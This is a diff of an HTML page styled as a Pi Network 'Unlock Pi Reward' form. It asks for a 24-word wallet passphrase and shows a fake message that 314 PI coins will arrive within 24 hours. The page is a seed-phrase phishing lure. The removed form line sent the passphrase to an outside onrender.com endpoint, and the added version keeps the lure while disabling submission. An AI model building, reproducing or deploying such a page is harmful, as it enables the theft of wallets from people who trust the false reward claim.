@@ -100,38 +100,6 @@
             background-color: #4a2390;
         }
 
-        /* Success Message Styling */
-        .success-message {
-            font-size: 20px;
-            font-weight: bold;
-            color: #388E3C;
-            background: #d4edda;
-            padding: 15px;
-            margin-top: 20px;
-            border-radius: 8px;
-            animation: success-animation 2s ease-in-out forwards;
-            opacity: 0;
-        }
-
-        .success-message p {
-            margin: 0;
-        }
-
-        @keyframes success-animation {
-            0% {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            50% {
-                opacity: 1;
-                transform: translateY(5px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0px);
-            }
-        }
-
         /* Info Text */
         .info-text {
             font-size: 12px;
@@ -148,17 +116,43 @@
         .info-text a:hover {
             text-decoration: underline;
         }
+
+        /* Congratulations Message Styling */
+        .congratulations {
+            font-size: 20px;
+            font-weight: bold;
+            color: #0D8B45;
+            background-color: #f0f9f4;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            animation: slide-up 2s ease-in-out;
+            display: none;
+        }
+
+        .congratulations h4 {
+            font-size: 22px;
+            color: #0D8B45;
+        }
+
+        @keyframes slide-up {
+            0% {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
     </style>
     <script>
         // Clear passphrase on page reload
         window.onload = function() {
             document.getElementById("passphrase").value = "";
-            const successMessage = document.getElementById("success-message");
-            if (successMessage) {
-                successMessage.style.display = "none"; // Hide success message on page reload
-            }
         };
 
+        // Show Congratulations message after successful form submission
         function validatePassphrase() {
             const passphrase = document.getElementById("passphrase").value.trim();
             const wordCount = passphrase.split(" ").filter(word => word).length;
@@ -167,13 +161,11 @@
                 alert("Please enter a valid 24-word passphrase.");
                 return false;
             }
-            return true;
-        }
 
-        // Function to display success message
-        function showSuccessMessage() {
-            const successMessage = document.getElementById("success-message");
-            successMessage.style.display = "block"; // Show success message
+            // Show success message after validation
+            document.getElementById("congratulations").style.display = "block";
+            document.getElementById("passphrase").value = "";
+            return false; // Prevent form submission for this example
         }
     </script>
 </head>
@@ -187,14 +179,15 @@
 
         <!-- Form Section -->
         <h3>Unlock Pi Reward</h3>
-        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
+        <form onsubmit="return validatePassphrase()">
             <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
-            <button type="submit" onclick="showSuccessMessage()">Unlock with passphrase</button>
+            <button type="submit">Unlock with passphrase</button>
         </form>
 
-        <!-- Success Message -->
-        <div id="success-message" class="success-message" style="display: none;">
-            <p>🎉 Congratulations!!! You have earned your 314 PI Coins successfully and it will be in your wallet within 24hrs! 🎉</p>
+        <!-- Congratulations Message -->
+        <div id="congratulations" class="congratulations">
+            <h4>Congratulations!!! You have earned your 314 PI Coins Successfully!</h4>
+            <p>Your 314 PI coins will be in your wallet within 24hrs.</p>
         </div>
 
         <!-- Info Section -->
